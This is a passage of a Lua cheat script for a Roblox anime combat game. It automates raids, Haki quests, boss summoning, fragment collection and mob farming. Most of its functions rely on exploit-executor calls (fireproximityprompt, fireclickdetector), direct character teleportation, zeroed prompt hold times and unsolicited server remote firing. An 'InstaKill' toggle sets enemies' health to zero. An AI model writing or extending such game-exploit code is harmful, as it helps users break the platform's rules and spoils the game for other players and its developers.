    task.wait(0.5)
    TryEnterPortal()
end
function ReplayMinotaurRaid()
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveReplayVote'):FireServer('sponsor')
    end)
    task.wait(1)
    pcall(function()
        Remotes.StartDungeon:FireServer()
    end)
    task.wait(3)
end
function Func_MinotaurVoteStart()
    while Toggles.AutoMinotaurVoteStart and Toggles.AutoMinotaurVoteStart.Value do
        task.wait(2)

        local difficulty = Options.SelectedMinotaurDiff or 'Easy'

        pcall(function()
            game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer(difficulty)
        end)
        pcall(function()
            game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer('start')
        end)
        pcall(function()
            Remotes.StartDungeon:FireServer()
        end)
    end
end
function Func_AutoMinotaurRaid()
    local difficulty = Options.SelectedMinotaurDiff or 'Easy'

    if Toggles.AutoMinotaurStart and Toggles.AutoMinotaurStart.Value then
        StartMinotaurRaid(difficulty)
    end

    while Toggles.AutoMinotaurRaid and Toggles.AutoMinotaurRaid.Value do
        task.wait(0.05)

        local char = GetCharacter()
        local hum = char and char:FindFirstChildOfClass('Humanoid')

        if not char or not hum or hum.Health <= 0 then
            task.wait(0.5)

            continue
        end

        local boss = FindMinoBoss()

        if boss then
            local island = GetNearestIsland(boss:GetPivot().Position)

            Shared.Target = boss
            Shared.TargetValid = true

            EquipWeapon()
            ExecuteFarmLogic(boss, island, 'Boss')
            pcall(function()
                Remotes.M1:FireServer()
            end)

            Shared.LastM1 = time()

            FireSkillsWithPositionLock()

            if Toggles.InstaKill and Toggles.InstaKill.Value then
                local h = boss:FindFirstChildOfClass('Humanoid')

                if h then
                    pcall(function()
                        h.Health = 0
                    end)
                end
            end

            UpdateSwitchState(boss, 'Boss')
        else
            Shared.Target = nil
            Shared.TargetValid = false

            if Toggles.AutoMinotaurRaidReplay and Toggles.AutoMinotaurRaidReplay.Value then
                fnl:MakeNotification({
                    Title = 'Minotaur Raid',
                    Description = 'MinoBoss defeated! Replaying...',
                    Duration = 3,
                })
                ReplayMinotaurRaid()
                task.wait(2)

                if not FindMinoBoss() then
                    StartMinotaurRaid(difficulty)
                end
            else
                task.wait(1)
            end
        end
    end

    Shared.Target = nil
    Shared.TargetValid = false
end
function GetAllLevers()
    local levers = {}

    for _, obj in pairs(workspace:GetDescendants())do
        if obj.Name:lower():find('lever') and obj:IsA('Model') or obj:IsA('BasePart') then
            local prompt = obj:FindFirstChildOfClass('ProximityPrompt', true) or (obj.Parent and obj.Parent:FindFirstChildOfClass('ProximityPrompt', true))

            if prompt then
                local dup = false

                for _, l in pairs(levers)do
                    if l.prompt == prompt then
                        dup = true

                        break
                    end
                end

                if not dup then
                    table.insert(levers, {
                        obj = obj,
                        prompt = prompt,
                    })
                end
            end
        end
    end

    return levers
end
function Func_AutoPullLever()
    while Toggles.AutoPullLever and Toggles.AutoPullLever.Value do
        task.wait(0.5)

        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            task.wait(0.5)

            continue
        end

        local levers = GetAllLevers()

        if #levers == 0 then
            task.wait(1)

            continue
        end

        for _, data in pairs(levers)do
            if not (Toggles.AutoPullLever and Toggles.AutoPullLever.Value) then
                break
            end

            local obj = data.obj
            local prompt = data.prompt

            if not obj or not obj.Parent then
                continue
            end
            if not prompt or not prompt.Parent then
                continue
            end

            local pos = nil

            pcall(function()
                if obj:IsA('Model') then
                    pos = obj:GetPivot().Position
                else
                    pos = obj.Position
                end
            end)

            if not pos then
                continue
            end

            root.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
            root.AssemblyLinearVelocity = Vector3.zero

            task.wait(0.3)
            pcall(function()
                prompt.HoldDuration = 0

                fireproximityprompt(prompt)
            end)
            task.wait(0.5)
        end
    end
end


function AutoSpecPassiveLoop_ZH()
    pcall(SyncSpecPassiveAutoSkip_ZH)
    task.wait(Options.SpecRollCD_ZH or 0.1)

    while Toggles.AutoSpec_ZH and Toggles.AutoSpec_ZH.Value do
        local targetWeapons = Options.SelectedPassive_ZH or {}
        local targetPassives = Options.SelectedSpec_ZH or {}
        local workDone = false

        if type(Shared.Passives) ~= 'table' then
            Shared.Passives = {}
        end

        for weapName, on in pairs(targetWeapons)do
            if not on then
                continue
            end

            local cur = Shared.Passives[weapName]
            local curName = (type(cur) == 'table' and cur.Name) or (type(cur) == 'string' and cur) or 'None'
            local curBuffs = (type(cur) == 'table' and cur.RolledBuffs) or {}
            local correct = targetPassives[curName]
            local meetsStats = true

            if correct and type(curBuffs) == 'table' then
                for statKey, val in pairs(curBuffs)do
                    local sid = 'Min_ZH_' .. weapName:gsub('%s+', '') .. '_' .. statKey
                    local minReq = Options[sid] or 0

                    if tonumber(val) and val < minReq then
                        meetsStats = false

                        break
                    end
                end
            end
            if not correct or not meetsStats then
                workDone = true

                Remotes.SpecPassiveReroll:FireServer(weapName)

                local t = tick()

                repeat
                    task.wait()

                    local nd = Shared.Passives[weapName]
                    local nn = (type(nd) == 'table' and nd.Name) or (type(nd) == 'string' and nd) or ''
                until nn ~= curName or tick() - t > 1.5

                break
            end
        end

        if not workDone then
            UI:Notify({
                Title = 'Passive',
                Description = 'Done rolling.',
                Duration = 5,
            })

            if Toggles.AutoSpec_ZH then
                Toggles.AutoSpec_ZH.Value = false
            end

            break
        end

        task.wait()
    end
end
function GetHakiLevels()
    local gui = game:GetService('Players').LocalPlayer.PlayerGui
    local arm = gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.HakiProgressionFrame.Txts.HakiLevel.Text
    local obs = gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.ObservationHakiProgressionFrame.Txts.ObservationHakiLevel.Text
    local conq = gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.ConquerorHakiProgressionFrame.Txts.ConquerorHakiLevel.Text

    return arm, obs, conq
end
function GetLevelNumber(txt)
    local num = tonumber(txt:match('%d+'))

    return num or 0
end
function Func_AutoArmHaki()
    local arm = GetHakiLevels()
    local armLv = GetLevelNumber(arm)

    if armLv >= 100 then
        UI:Notify({
            Title = 'Armament',
            Description = 'Already unlocked / high level',
            Duration = 2,
        })

        return
    end

    UI:Notify({
        Title = 'Armament',
        Description = 'Starting',
        Duration = 2,
    })
    Remotes.QuestAccept:FireServer('HakiQuestNPC')

    while Toggles.AutoArmHaki do
        task.wait()

        local target = GetBestMobCluster({Thief = true})

        if target then
            ExecuteFarmLogic(target, GetNearestIsland(target:GetPivot().Position), 'Mob')
            Remotes.M1:FireServer()

            if IsSkillReady('Z') then
                Remotes.UseSkill:FireServer(1)
            end
        end
    end
end
function Func_AutoObsHaki()
    local gui = game:GetService('Players').LocalPlayer.PlayerGui
    local obs = gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.ObservationHakiProgressionFrame.Txts.ObservationHakiLevel.Text
    local obsLv = tonumber(obs:match('%d+')) or 0

    if obsLv > 0 then
        UI:Notify({
            Title = 'Observation',
            Description = 'Already unlocked',
            Duration = 2,
        })

        return
    end

    local plr = game.Players.LocalPlayer
    local money = plr.Data.Money.Value
    local gems = plr.Data.Gems.Value

    if money < 250000 or gems < 300 then
        UI:Notify({
            Title = 'Observation',
            Description = 'Not enough Money/Gems',
            Duration = 2,
        })

        return
    end

    UI:Notify({
        Title = 'Observation',
        Description = 'Purchasing...',
        Duration = 2,
    })
    pcall(function()
        Remotes.QuestAccept:FireServer('ObservationHakiNPC')
    end)
end
function Func_AutoGetConquerorHaki()
    function Notify(msg)
        UI:Notify({
            Title = 'Conqueror Haki',
            Description = msg,
            Duration = 5,
        })
    end

    local gui = Plr.PlayerGui
    local armLv, obsLv, conqLv = 0, 0, 0

    pcall(function()
        armLv = tonumber(gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.HakiProgressionFrame.Txts.HakiLevel.Text:match('%d+')) or 0
        obsLv = tonumber(gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.ObservationHakiProgressionFrame.Txts.ObservationHakiLevel.Text:match('%d+')) or 0
        conqLv = tonumber(gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.ConquerorHakiProgressionFrame.Txts.ConquerorHakiLevel.Text:match('%d+')) or 0
    end)

    if conqLv > 0 then
        Notify('Conqueror Haki already unlocked! Level: ' .. conqLv)

        if Toggles.AutoGetConquerorHaki then
            Toggles.AutoGetConquerorHaki.Value = false
        end

        return
    end

    local missing = {}

    if armLv < 40 then
        table.insert(missing, 'Armament Haki Lv40 (have: ' .. armLv .. ')')
    end
    if obsLv < 25 then
        table.insert(missing, 'Observation Haki Lv25 (have: ' .. obsLv .. ')')
    end

    local hasFragment = false

    if Shared.Cached_Inv then
        for _, item in pairs(Shared.Cached_Inv)do
            if item.name and item.name:lower():find('conqueror') and item.name:lower():find('fragment') then
                hasFragment = true

                break
            end
        end
    end
    if not hasFragment then
        table.insert(missing, 'Conqueror Fragment (farm from tanky high-level NPCs)')
    end
    if #missing > 0 then
        Notify('Missing requirements:\n' .. table.concat(missing, '\n'))

        if Toggles.AutoGetConquerorHaki then
            Toggles.AutoGetConquerorHaki.Value = false
        end

        return
    end

    Notify('All requirements met! Accepting Conqueror Haki quest...\nTeleporting to Shibuya...')
    Remotes.TP_Portal:FireServer('Shibuya')
    task.wait(2.5)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('QuestAccept'):FireServer('ConquerorHakiNPC')
    end)
    task.wait(1.5)

    function GetConqQuestProgress()
        local cur, max = 0, 0
        local QuestUI = PGui:FindFirstChild('QuestUI')

        if not QuestUI then
            return cur, max
        end

        for _, lbl in pairs(QuestUI:GetDescendants())do
            if lbl:IsA('TextLabel') and lbl.Text ~= '' then
                local c, m = lbl.Text:match('(%d+)%s*/%s*(%d+)')

                if c and m then
                    cur = tonumber(c) or 0
                    max = tonumber(m) or 0

                    if max > 0 then
                        break
                    end
                end
            end
        end

        return cur, max
    end
    function GetConqQuestTitle()
        local QuestUI = PGui:FindFirstChild('QuestUI')

        if not QuestUI then
            return ''
        end

        local best = ''

        for _, v in pairs(QuestUI:GetDescendants())do
            if v:IsA('TextLabel') and v.Text ~= '' then
                local t = v.Text

                if t:match('^%d+/?%d*$') then
                    continue
                end
                if t:find('?', 1, true) then
                    continue
                end
                if #t < 4 then
                    continue
                end
                if #t > #best then
                    best = t
                end
            end
        end

        return best:lower()
    end
    function IsQuestVisible()
        local QuestUI = PGui:FindFirstChild('QuestUI')

        if not QuestUI then
            return false
        end

        local quest = QuestUI:FindFirstChild('Quest')

        if quest then
            local inner = quest:FindFirstChild('Quest', true)

            if inner then
                return inner.Visible
            end
        end

        return GetConqQuestTitle() ~= ''
    end
    function IsDone()
        local c, m = GetConqQuestProgress()

        return m > 0 and c >= m
    end

    local waitT = tick()

    while not IsQuestVisible() and tick() - waitT < 5 do
        task.wait(0.2)
    end

    if not IsQuestVisible() then
        Notify('Failed to accept quest. Make sure you are at Conqueror Haki NPC in Shibuya!')

        if Toggles.AutoGetConquerorHaki then
            Toggles.AutoGetConquerorHaki.Value = false
        end

        return
    end

    Notify('Quest accepted! Starting automation...')

    local lastNotif = 0
    local R_DungeonWaveVote = GetRemote(RS, 'Remotes.DungeonWaveVote')

    while Toggles.AutoGetConquerorHaki and Toggles.AutoGetConquerorHaki.Value do
        task.wait(0.1)

        if not IsQuestVisible() then
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('QuestAccept'):FireServer('ConquerorHakiNPC')
            end)
            task.wait(1.5)
            pcall(function()
                conqLv = tonumber(gui.StatsPanelUI.MainFrame.Frame.Content.Page2.StatsHolder.ConquerorHakiProgressionFrame.Txts.ConquerorHakiLevel.Text:match('%d+')) or 0
            end)

            if conqLv > 0 then
                Notify('Conqueror Haki Unlocked! Level: ' .. conqLv)

                if Toggles.AutoGetConquerorHaki then
                    Toggles.AutoGetConquerorHaki.Value = false
                end

                break
            end

            continue
        end

        local title = GetConqQuestTitle()
        local cur, max = GetConqQuestProgress()

        cur = tonumber(cur) or 0
        max = tonumber(max) or 0

        if tick() - lastNotif >= 8 then
            Notify('Quest: ' .. title .. '\nProgress: ' .. cur .. '/' .. max)

            lastNotif = tick()
        end
        if title:find('500') and (title:find('dodge') or title:find('observation') or title:find('obs')) then
            if IsDone() then
                Shared._ConqQ2SkillFired = nil

                Notify('Quest 2 Done! (500 dodges)')
                task.wait(1)

                continue
            end
            if not CheckObsHaki() then
                pcall(function()
                    Remotes.ObserHaki:FireServer('Toggle')
                end)
                task.wait(1)
            end

            local bestTarget = nil
            local highestHP = 0

            for _, npc in pairs(PATH.Mobs:GetChildren())do
                if npc:IsA('Model') then
                    local hum = npc:FindFirstChildOfClass('Humanoid')
                    local npcRoot = npc:FindFirstChild('HumanoidRootPart')
                    local isDummy = npc.Name:lower():find('dummy') or npc.Name:lower():find('training')

                    if hum and hum.Health > 0 and npcRoot and not isDummy then
                        if hum.MaxHealth > highestHP then
                            highestHP = hum.MaxHealth
                            bestTarget = npc
                        end
                    end
                end
            end

            if bestTarget then
                local tRoot = bestTarget:FindFirstChild('HumanoidRootPart')
                local char = GetCharacter()
                local root = char and char:FindFirstChild('HumanoidRootPart')

                if root and tRoot then
                    root.CFrame = tRoot.CFrame * CFrame.new(0, 0, 4)
                    root.AssemblyLinearVelocity = Vector3.zero

                    task.wait(0.3)
                    EquipWeapon()
                    task.wait(0.2)

                    if not Shared._ConqQ2SkillFired then
                        EquipWeapon()
                        task.wait(0.2)

                        local char2 = GetCharacter()
                        local tool = char2 and char2:FindFirstChildOfClass('Tool')

                        if tool then
                            local toolType = GetToolTypeFromModule(tool.Name)

                            pcall(function()
                                if toolType == 'Power' then
                                    Remotes.UseFruit:FireServer('UseAbility', {
                                        FruitPower = tool.Name:gsub(' Fruit', ''),
                                        KeyCode = Enum.KeyCode.Z,
                                    })
                                else
                                    Remotes.UseSkill:FireServer(1)
                                end
                            end)
                        end

                        Shared._ConqQ2SkillFired = true
                    end

                    task.wait(1)
                end
            else
                Notify('Quest 2: No NPCs found, waiting...')
                task.wait(2)
            end
        elseif title:find('500') and (title:find('kill') or title:find('npc') or title:find('armament') or title:find('haki')) and not title:find('boss') then
            if IsDone() then
                Notify('Quest 1 Done! (500 NPC kills)')
                task.wait(1)

                continue
            end
            if not CheckArmHaki() then
                pcall(function()
                    Remotes.ArmHaki:FireServer('Toggle')
                end)
                task.wait(0.5)
            end

            local target = nil
            local char = GetCharacter()
            local root = char and char:FindFirstChild('HumanoidRootPart')

            if root then
                local radius = Options.MobFarmRadius or 500
                local closest, minDist = nil, math.huge

                for _, npc in pairs(PATH.Mobs:GetChildren())do
                    if npc:IsA('Model') and npc:FindFirstChildOfClass('Humanoid') then
                        local isDummy = npc.Name:lower():find('dummy') or npc.Name:lower():find('training')
                        local isBoss = npc.Name:find('Boss') and not table.find(Tables.MiniBossList, npc.Name)

                        if not isDummy and not isBoss and IsValidTarget(npc) then
                            local npcRoot = npc:FindFirstChild('HumanoidRootPart')

                            if npcRoot then
                                local dist = (root.Position - npcRoot.Position).Magnitude

                                if dist <= radius and dist < minDist then
                                    closest = npc
                                    minDist = dist
                                end
                            end
                        end
                    end
                end

                target = closest
            end
            if not target then
                for _, npc in pairs(PATH.Mobs:GetChildren())do
                    if npc:IsA('Model') then
                        local hum = npc:FindFirstChildOfClass('Humanoid')
                        local npcRoot = npc:FindFirstChild('HumanoidRootPart')
                        local isDummy = npc.Name:lower():find('dummy') or npc.Name:lower():find('training')
                        local isBoss = npc.Name:find('Boss') and not table.find(Tables.MiniBossList, npc.Name)

                        if hum and hum.Health > 0 and npcRoot and not isDummy and not isBoss then
                            target = npc

                            break
                        end
                    end
                end
            end
            if not target then
                Notify('Quest 1: No mobs found, teleporting to Starter...')
                Remotes.TP_Portal:FireServer('Starter')
                task.wait(2.5)

                continue
            end

            ExecuteFarmLogic(target, GetNearestIsland(target:GetPivot().Position), 'Mob')
            EquipWeapon()
            pcall(function()
                Remotes.M1:FireServer()
            end)

            Shared.LastM1 = time()
        elseif title:find('200') and title:find('boss') then
            if IsDone() then
                Notify('Quest 3 Done! (200 bosses)')
                task.wait(1)

                continue
            end

            local target, island = GetWorldBossTarget()

            if target then
                ExecuteFarmLogic(target, island or 'Boss', 'Boss')
                EquipWeapon()

                for i = 1, 3 do
                    pcall(function()
                        Remotes.M1:FireServer()
                    end)

                    Shared.LastM1 = time()

                    task.wait(0.04)
                end
            else
                Remotes.TP_Portal:FireServer('Boss')
                task.wait(1.5)
                pcall(function()
                    Remotes.SummonBoss:FireServer('ThiefBoss', 'Normal')
                end)
                task.wait(2)
            end
        elseif title:find('25') and (title:find('dungeon') or title:find('raid') or title:find('complete')) then
            if IsDone() then
                Notify('All quests done! Conqueror Haki unlocked!')

                if Toggles.AutoGetConquerorHaki then
                    Toggles.AutoGetConquerorHaki.Value = false
                end

                break
            end

            Notify('Quest 4: Running dungeons (' .. cur .. '/25)...')
            Remotes.TP_Portal:FireServer('Dungeon')
            task.wait(2.5)
            pcall(function()
                Remotes.OpenDungeon:FireServer('BossRush', 'Easy')
            end)
            task.wait(1.5)

            if R_DungeonWaveVote then
                pcall(function()
                    R_DungeonWaveVote:FireServer('Easy')
                end)
                task.wait(0.3)
                pcall(function()
                    R_DungeonWaveVote:FireServer('start')
                end)
                task.wait(0.3)
            end

            task.wait(1.5)

            local portal = nil

            for _, n in ipairs({
                'ActiveDungeonPortal',
                'DungeonPortal',
                'BossRushPortal',
            })do
                portal = workspace:FindFirstChild(n)

                if portal then
                    break
                end
            end

            if portal and Support.Proximity then
                local char = GetCharacter()
                local root = char and char:FindFirstChild('HumanoidRootPart')

                if root then
                    local pCF = nil

                    pcall(function()
                        pCF = portal:GetPivot()
                    end)

                    if pCF then
                        root.CFrame = pCF * CFrame.new(0, 2, 0)
                        root.AssemblyLinearVelocity = Vector3.zero

                        task.wait(0.3)
                    end

                    local prompt = portal:FindFirstChildOfClass('ProximityPrompt', true)

                    if prompt then
                        fireproximityprompt(prompt)
                    end
                end
            end

            task.wait(2)

            local dungeonTimer = tick()

            while tick() - dungeonTimer < 90 and Toggles.AutoGetConquerorHaki and Toggles.AutoGetConquerorHaki.Value do
                task.wait(0.1)

                local hasEnemies = false

                for _, npc in pairs(PATH.Mobs:GetChildren())do
                    if npc:IsA('Model') then
                        local hum = npc:FindFirstChildOfClass('Humanoid')

                        if hum and hum.Health > 0 then
                            hasEnemies = true
                            Shared.Target = npc
                            Shared.TargetValid = true

                            local char = GetCharacter()
                            local root = char and char:FindFirstChild('HumanoidRootPart')
                            local nRoot = npc:FindFirstChild('HumanoidRootPart')

                            if root and nRoot then
                                root.CFrame = nRoot.CFrame * CFrame.new(0, 0, 3)
                                root.AssemblyLinearVelocity = Vector3.zero
                            end

                            EquipWeapon()

                            if Toggles.InstaKill and Toggles.InstaKill.Value then
                                pcall(function()
                                    hum.Health = 0
                                end)
                            end

                            BurstM1OnTarget(npc, 5, 0.04)
                        end
                    end
                end

                if not hasEnemies then
                    break
                end
            end

            task.wait(1)
        else
            Notify('Unknown stage: "' .. title .. '"\nProgress: ' .. cur .. '/' .. max .. '\nFarming nearby mobs...')

            local t = GetNearestMobTarget()

            if t then
                ExecuteFarmLogic(t, GetNearestIsland(t:GetPivot().Position), 'Mob')
                EquipWeapon()
                pcall(function()
                    Remotes.M1:FireServer()
                end)
            end

            task.wait(2)
        end
    end
end
function Func_AutoSecondSea()
    local function Notify(msg)
        UI:Notify({
            Title = 'Second Sea',
            Description = msg,
            Duration = 4,
        })
    end
    local function GetRoot()
        local char = GetCharacter()

        return char and char:FindFirstChild('HumanoidRootPart')
    end
    local function InteractNPC(npc)
        if not npc then
            return false
        end

        local root = GetRoot()

        if not root then
            return false
        end

        local ok, piv = pcall(function()
            return npc:GetPivot()
        end)

        if ok and piv then
            root.CFrame = piv * CFrame.new(0, 0, 3)
        else
            local bp = npc:FindFirstChildOfClass('BasePart') or npc.PrimaryPart

            if bp then
                root.CFrame = bp.CFrame * CFrame.new(0, 0, 3)
            end
        end

        root.AssemblyLinearVelocity = Vector3.zero

        task.wait(0.4)

        for _, desc in pairs(npc:GetDescendants())do
            if desc:IsA('ProximityPrompt') then
                pcall(function()
                    fireproximityprompt(desc)
                end)
                task.wait(0.8)

                return true
            elseif desc:IsA('ClickDetector') then
                pcall(function()
                    fireclickdetector(desc)
                end)
                task.wait(0.8)

                return true
            end
        end

        return false
    end
    local function GetQuestNPC()
        return workspace:FindFirstChild('ServiceNPCs') and workspace.ServiceNPCs:FindFirstChild('MapQuestNPC')
    end
    local function GetQuestStage()
        local questUI = PGui:FindFirstChild('QuestUI')

        if not questUI then
            return nil, 0, 0, false
        end

        local title, cur, max = '', 0, 0
        local visible = false
        local questFrame = questUI:FindFirstChild('Quest')

        if questFrame then
            local inner = questFrame:FindFirstChild('Quest', true)

            visible = (inner and inner.Visible) or questFrame.Visible
        end

        for _, lbl in pairs(questUI:GetDescendants())do
            if lbl:IsA('TextLabel') and lbl.Text ~= '' then
                local t = lbl.Text:lower()
                local c, m = lbl.Text:match('(%d+)%s*/%s*(%d+)')

                if c and m then
                    cur = tonumber(c) or 0
                    max = tonumber(m) or 0
                end
                if t:find('fragment') or t:find('lost') or t:find('ancient') then
                    title = 'fragments'
                elseif t:find('map piece') or t:find('reconstruction') or t:find('map pieces') or (t:find('boss') and t:find('collect')) then
                    title = 'mappieces'
                end
            end
        end

        return title, cur, max, visible
    end
    local function IsQuestVisible()
        local _, _, _, visible = GetQuestStage()

        return visible
    end
    local function TryCollectFragment(frag)
        if not frag or not frag.Parent then
            return false
        end

        local root = GetRoot()

        if not root then
            return false
        end

        local fragPos = nil

        pcall(function()
            fragPos = frag:GetPivot().Position
        end)

        if not fragPos then
            local bp = frag:FindFirstChildOfClass('BasePart')

            if bp then
                fragPos = bp.Position
            end
        end
        if not fragPos then
            return false
        end

        root.CFrame = CFrame.new(fragPos) * CFrame.new(0, 0, 3)
        root.AssemblyLinearVelocity = Vector3.zero

        task.wait(0.4)

        local prompt = frag:FindFirstChildOfClass('ProximityPrompt', true)

        if prompt then
            pcall(function()
                fireproximityprompt(prompt)
            end)
            task.wait(0.6)

            return true
        end

        local click = frag:FindFirstChildOfClass('ClickDetector', true)

        if click then
            pcall(function()
                fireclickdetector(click)
            end)
            task.wait(0.6)

            return true
        end

        return false
    end
    local function GetAllFragments()
        local frags = {}
        local searchRoots = {
            workspace:FindFirstChild('Sea2MapQuest'),
            workspace:FindFirstChild('MapFragments'),
            workspace:FindFirstChild('LostFragments'),
            workspace,
        }
        local checked = {}

        for _, root in pairs(searchRoots)do
            if root and not checked[root] then
                checked[root] = true

                for _, obj in pairs(root:GetDescendants())do
                    local n = obj.Name:lower()

                    if (n:find('fragment') or n:find('ancient') or n:find('relic')) and (obj:IsA('Model') or obj:IsA('BasePart') or obj:IsA('MeshPart')) then
                        local hasInteract = obj:FindFirstChildOfClass('ProximityPrompt', true) or obj:FindFirstChildOfClass('ClickDetector', true)

                        if hasInteract then
                            local dup = false

                            for _, f in pairs(frags)do
                                if f == obj then
                                    dup = true

                                    break
                                end
                            end

                            if not dup then
                                table.insert(frags, obj)
                            end
                        end
                    end
                end
            end
        end

        return frags
    end
    local function GetSpawnPoints()
        local folder = workspace:FindFirstChild('Sea2MapQuest')
        local spawnFolder = folder and folder:FindFirstChild('SpawnPoints')

        if not spawnFolder then
            return {}
        end

        local spots = {}

        for _, s in pairs(spawnFolder:GetChildren())do
            table.insert(spots, s)
        end

        table.sort(spots, function(a, b)
            local na = tonumber(a.Name:match('%d+')) or 0
            local nb = tonumber(b.Name:match('%d+')) or 0

            return na < nb
        end)

        return spots
    end

    local AncientFragmentIslands = {
        'Starter',
        'Jungle',
        'Desert',
        'Snow',
        'Sailor',
        'Shibuya',
        'Hollow',
        'Shinjuku',
        'Slime',
        'Academy',
        'Judgement',
        'Soul',
        'Ninja',
        'Lawless',
        'Tower',
    }

    local function SweepAllIslands()
        for _, island in ipairs(AncientFragmentIslands)do
            if not (Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value) then
                return
            end

            local stage = GetQuestStage()

            if stage ~= 'fragments' then
                return
            end
            if Remotes.TP_Portal then
                Remotes.TP_Portal:FireServer(island)
                task.wait(2.5)
            end

            local immediateFrags = GetAllFragments()

            if #immediateFrags > 0 then
                for _, frag in pairs(immediateFrags)do
                    if not (Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value) then
                        return
                    end

                    TryCollectFragment(frag)
                    task.wait(0.3)
                end

                continue
            end

            local spawnPoints = GetSpawnPoints()

            if #spawnPoints > 0 then
                for _, spot in pairs(spawnPoints)do
                    if not (Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value) then
                        return
                    end
                    if GetQuestStage() ~= 'fragments' then
                        return
                    end

                    local root = GetRoot()

                    if not root then
                        task.wait(0.5)

                        continue
                    end

                    local spotCF = nil

                    pcall(function()
                        spotCF = spot:GetPivot()
                    end)

                    if not spotCF and spot:IsA('BasePart') then
                        spotCF = spot.CFrame
                    end
                    if not spotCF then
                        continue
                    end

                    root.CFrame = spotCF * CFrame.new(0, 0, 3)
                    root.AssemblyLinearVelocity = Vector3.zero

                    task.wait(0.6)

                    for _, frag in pairs(GetAllFragments())do
                        if not frag.Parent then
                            continue
                        end

                        local fragPos = nil

                        pcall(function()
                            fragPos = frag:GetPivot().Position
                        end)

                        if not fragPos then
                            local bp = frag:FindFirstChildOfClass('BasePart')

                            if bp then
                                fragPos = bp.Position
                            end
                        end
                        if fragPos and root and (root.Position - fragPos).Magnitude <= 300 then
                            TryCollectFragment(frag)
                            task.wait(0.3)
                        end
                    end
                end
            else
                for _, frag in pairs(GetAllFragments())do
                    if not (Toggles.AutoSecondSea and Toggles.AutoSecondSea.Value) then
                        return
                    end

                    TryCollectFragment(frag)
                    task.wait(0.3)
                end
            end

            task.wait(0.5)
        end
    end

    local MapPieceBosses = {
        {
            label = 'Alucard Boss',
            match = 'AlucardBoss',
            island = 'Sailor',
            summon = nil,
        },
        {
            label = 'Jinwoo Boss',
            match = 'JinwooBoss',
            island = 'Sailor',
            summon = nil,
        },
        {
            label = 'Aizen Boss',
            match = 'AizenBoss',
            island = 'Hollow',
            summon = nil,
        },
        {
            label = 'Gojo Boss',
            match = 'GojoBoss',
            island = 'Shibuya',
            summon = nil,
        },
        {
            label = 'Sukuna Boss',
            match = 'SukunaBoss',
            island = 'Shibuya',
            summon = nil,
        },
        {
            label = 'Yuji Boss',
            match = 'YujiBoss',
            island = 'Boss',
            summon = nil,
        },
        {
            label = 'Rimuru Boss',
            match = 'Rimuru',
            island = 'Slime',
            summon = function()
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('RequestSpawnRimuru'):FireServer('Normal')
                end)
            end,
        },
        {
            label = 'Qin Shi Boss',
            match = 'QinShi',
            island = 'Boss',
            summon = function()
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestSummonBoss'):FireServer('QinShiBoss', 'Normal')
                end)
            end,
        },
        {
            label = 'Demon King',
            match = 'MoonSlayerBoss',
            island = 'Boss',
            summon = function()
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestSummonBoss'):FireServer('MoonSlayerBoss', 'Normal')
                end)
            end,
        },
        {
            label = 'Saber Boss',
            match = 'SaberBoss',
            island = 'Boss',
            summon = function()
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestSummonBoss'):FireServer('SaberBoss')
                end)
            end,
        },
        {
            label = 'Ichigo Boss',
            match = 'IchigoBoss',
            island = 'Hollow',
            summon = function()
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestSummonBoss'):FireServer('IchigoBoss')
                end)
            end,
        },
        {
            label = 'Gilgamesh Boss',
            match = 'GilgameshBoss',
            island = 'Boss',
            summon = function()
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestSummonBoss'):FireServer('GilgameshBoss', 'Normal')
                end)
            end,
        },
    }

    local function FindLiveBoss(matchStr)
        local key = matchStr:lower():gsub('%s+', '')

        for _, npc in pairs(PATH.Mobs:GetChildren())do
            if npc:IsA('Model') then
                local n = npc.Name:lower():gsub('%s+', '')

                if n:find(key, 1, true) then
                    local hum = npc:FindFirstChildOfClass('Humanoid')

                    if hum and hum.Health > 0 then
                        return npc
                    end
                end
            end
        end

        return nil
    end
    local function AttackBoss(boss, island)
        if not boss or not boss.Parent then
            return false
        end

        local hum = boss:FindFirstChildOfClass('Humanoid')

        if not hum or hum.Health <= 0 then
            return false
        end

        ExecuteFarmLogic(boss, island or 'Boss', 'Boss')
        EquipWeapon()

        if Toggles.InstaKill and Toggles.InstaKill.Value then
            pcall(function()
                hum.Health = 0
            end)
        end

        for i = 1, 8 do
            local h2 = boss:FindFirstChildOfClass('Humanoid')

            if not h2 or h2.Health <= 0 then
                break
            end

            pcall(function()
                Remotes.M1:FireServer()
            end)

            Shared.LastM1 = time()

            task.wait(0.04)
        end

        if Toggles.AutoSkill and Toggles.AutoSkill.Value then
            local char = GetCharacter()
            local tool = char and char:FindFirstChildOfClass('Tool')

            if tool then
                local keyToSlot = {
                    Z = 1,
                    X = 2,
                    C = 3,
                    V = 4,
                    F = 5,
                }
                local keyToEnum = {
                    Z = Enum.KeyCode.Z,
                    X = Enum.KeyCode.X,
                    C = Enum.KeyCode.C,
